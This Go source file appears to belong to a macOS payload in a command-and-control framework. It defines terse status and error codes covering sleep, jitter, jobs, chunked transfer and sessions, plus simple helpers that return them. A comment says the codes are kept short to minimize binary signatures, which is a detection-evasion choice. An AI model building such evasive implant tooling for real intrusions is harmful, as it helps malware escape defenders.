// server/docker/payloads/Darwin/codes.go

//go:build darwin
// +build darwin

package main

// Status codes - short codes to minimize binary signatures
const (
	// Success codes (S0-S9)
	S0 = "S0" // Generic success / OK
	S1 = "S1" // Created / stored
	S2 = "S2" // Deleted / removed
	S3 = "S3" // Updated / modified
	S4 = "S4" // Started / initiated
	S5 = "S5" // Completed / finished
	S6 = "S6" // Found / exists
	S7 = "S7" // Listed / enumerated

	// General errors (E0-E19)
	E1  = "E1"  // No arguments provided
	E2  = "E2"  // Invalid arguments
	E3  = "E3"  // Access denied / permission error
	E4  = "E4"  // Not found (file/directory/resource)
	E5  = "E5"  // Already exists
	E6  = "E6"  // Is a directory (expected file)
	E7  = "E7"  // Is a file (expected directory)
	E8  = "E8"  // Binary file detected
	E9  = "E9"  // Operation timed out
	E10 = "E10" // Read error
	E11 = "E11" // Write error
	E12 = "E12" // Network error
	E13 = "E13" // Resource busy
	E14 = "E14" // Read-only filesystem
	E15 = "E15" // Operation not permitted
	E16 = "E16" // Directory not empty
	E17 = "E17" // Invalid path
	E18 = "E18" // Decode/parse error
	E19 = "E19" // Internal error

	// Command-specific errors (E20-E39)
	E20 = "E20" // Flag requires argument
	E21 = "E21" // Unknown flag
	E22 = "E22" // Invalid value for flag
	E23 = "E23" // Missing required flag
	E24 = "E24" // Chunk transfer error
	E25 = "E25" // Execution failed
	E26 = "E26" // Job not found
	E27 = "E27" // Job already running
	E28 = "E28" // Invalid sleep value
	E29 = "E29" // Invalid jitter value
	E30 = "E30" // Session not active
	E31 = "E31" // Authentication failed
)

// Err returns error code
func Err(code string) string {
	return code
}

// ErrCtx returns error code with context (paths, values only - no text)
func ErrCtx(code, ctx string) string {
	if ctx == "" {
		return code
	}
	return code + ":" + ctx
}

// Succ returns success code
func Succ(code string) string {
	return code
}

// SuccCtx returns success code with context
func SuccCtx(code, ctx string) string {
	if ctx == "" {
		return code
	}
	return code + ":" + ctx
}
